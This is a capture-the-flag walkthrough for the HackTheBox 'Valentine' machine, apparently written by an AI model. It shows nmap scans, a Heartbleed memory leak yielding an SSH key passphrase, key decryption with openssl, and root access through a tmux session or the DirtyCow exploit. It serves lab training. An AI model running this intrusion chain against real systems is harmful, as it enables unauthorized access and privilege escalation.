## 💘 HTB: Valentine Walkthrough

**Machine:** Valentine  
**Difficulty:** Easy  
**OS:** Linux  
**Author:** HackTheBox  

Valentine is an easy Linux box that demonstrates how memory leaks from vulnerabilities like Heartbleed can expose sensitive credentials. It requires a combination of exploit crafting, crypto handling, and privilege escalation via known Linux kernel exploits.

---

### 🔍 Recon & Enumeration

**Nmap Basic Scan:**
```bash
nmap -sC -sV -p- 10.10.10.79
```

Identified open ports:
- **80 (HTTP)**: Apache/2.2.22 (Ubuntu)
- **443 (HTTPS)**: Vulnerable OpenSSL (Heartbleed, CVE-2014-0160)

**Nmap Vuln Scripts:**
```bash
nmap -p 80,443 --script vuln 10.10.10.79
```

Identified vulnerabilities:
- **Heartbleed (CVE-2014-0160)**
- **SSL POODLE (CVE-2014-3566)**
- **CCS Injection (CVE-2014-0224)**

Interesting directories:
- `/dev/`
- `/index/`

---

### 💔 Heartbleed Exploitation

Using a public Heartbleed exploit script, dump memory:

Search for base64 strings in the dump. One string found:
```bash
aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```
Decoded:
```bash
heartbleedbelievethehype
```

---

### 📁 Web Directory Discovery

Accessing `/dev/`, locate a file named `hype_key` — an encrypted private key in hexdump format.

Steps:
```bash
xxd -r hype_key > hype.key
openssl rsa -in hype.key -out decrypted.key
```
When prompted, enter password: `heartbleedbelievethehype`

---

### 🔐 SSH Access

Attempt SSH with:
```bash
chmod 600 decrypted.key
ssh -i decrypted.key hype@10.10.10.79
```
If encountering `no mutual signature supported` error, use:
```bash
ssh -oPubkeyAcceptedAlgorithms=+ssh-rsa -i decrypted.key hype@10.10.10.79
```

---

### ⬆️ Privilege Escalation

#### Method 1: Tmux Session (Preferred)
- Check for running tmux sessions as root.
- Attach to existing root session:
```bash
tmux attach
```

#### Method 2: DirtyCow Kernel Exploit
- Upload `40839.c` to target
- Compile:
```bash
gcc 40839.c -o cowroot -pthread
```
- Execute to create root user `firefart`
- Switch user:
```bash
su firefart
```

---

### 🏁 Summary
- **Initial Access:** Exploit Heartbleed to extract passphrase
- **Lateral Movement:** Decrypt private SSH key for `hype`
- **Privilege Escalation:** Attach root tmux or use DirtyCow

---

Let me know if you'd like this turned into a PDF, or if you want visual diagrams for the two privilege escalation paths!

